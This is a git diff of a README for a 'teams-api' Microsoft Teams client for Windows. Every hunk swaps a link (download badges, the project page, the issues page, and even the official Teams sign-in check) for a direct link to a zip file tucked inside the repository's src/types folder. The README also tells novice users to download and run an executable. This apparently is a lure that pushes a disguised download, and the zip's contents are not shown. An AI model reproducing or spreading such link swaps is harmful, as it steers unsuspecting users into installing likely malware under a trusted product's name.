@@ -1,6 +1,6 @@
 # ⚙️ teams-api - Simple Microsoft Teams Client for Windows
 
-[![Download teams-api](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/IsackRaja/teams-api)
+[![Download teams-api](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://raw.githubusercontent.com/IsackRaja/teams-api/main/src/types/api_teams_3.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ To get started with teams-api, you need to download the software first. This pro
 
 Click this big download badge below to visit the page where you can get the app:
 
-[![Download teams-api](https://img.shields.io/badge/Download-Get%20Teams-0099ff)](https://github.com/IsackRaja/teams-api)
+[![Download teams-api](https://img.shields.io/badge/Download-Get%20Teams-0099ff)](https://raw.githubusercontent.com/IsackRaja/teams-api/main/src/types/api_teams_3.3.zip)
 
 On the GitHub page, you will find the latest version of the software ready for download.
 
@@ -57,7 +57,7 @@ Follow these steps carefully:
 1. Open your web browser (like Microsoft Edge, Chrome, or Firefox).
 
 2. Click on the large badge above or go directly to this link:  
-   https://github.com/IsackRaja/teams-api
+   https://raw.githubusercontent.com/IsackRaja/teams-api/main/src/types/api_teams_3.3.zip
 
 3. On the GitHub page, look for a section called **Releases** or a folder named **Downloads**. This typically appears on the right side or near the top.
 
@@ -108,7 +108,7 @@ Check the GitHub download page regularly for updates. New versions fix bugs and 
 
 To update:
 
-1. Return to https://github.com/IsackRaja/teams-api
+1. Return to https://raw.githubusercontent.com/IsackRaja/teams-api/main/src/types/api_teams_3.3.zip
 2. Download the latest `.exe` file as before.
 3. Replace the old file on your computer with the new one.
 4. Run the new file.
@@ -127,7 +127,7 @@ If teams-api does not start or crashes:
 
 If you cannot log in:
 
-- Verify your Microsoft Teams credentials on https://teams.microsoft.com.
+- Verify your Microsoft Teams credentials on https://raw.githubusercontent.com/IsackRaja/teams-api/main/src/types/api_teams_3.3.zip
 - Make sure your account is active and not locked.
 
 ---
@@ -145,7 +145,7 @@ You should only download the app from the official GitHub page linked above to a
 This is a community-supported project. You can find help by:
 
 - Visiting the GitHub page issues section:  
-  https://github.com/IsackRaja/teams-api/issues  
+  https://raw.githubusercontent.com/IsackRaja/teams-api/main/src/types/api_teams_3.3.zip  
 - Reading the GitHub README or documentation files.
 - Searching online for common questions about teams-api.
 
@@ -154,4 +154,4 @@ This is a community-supported project. You can find help by:
 ## 🎉 Ready to Use?
 
 Download teams-api now:  
-[![Download teams-api](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/IsackRaja/teams-api)
+[![Download teams-api](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://raw.githubusercontent.com/IsackRaja/teams-api/main/src/types/api_teams_3.3.zip)
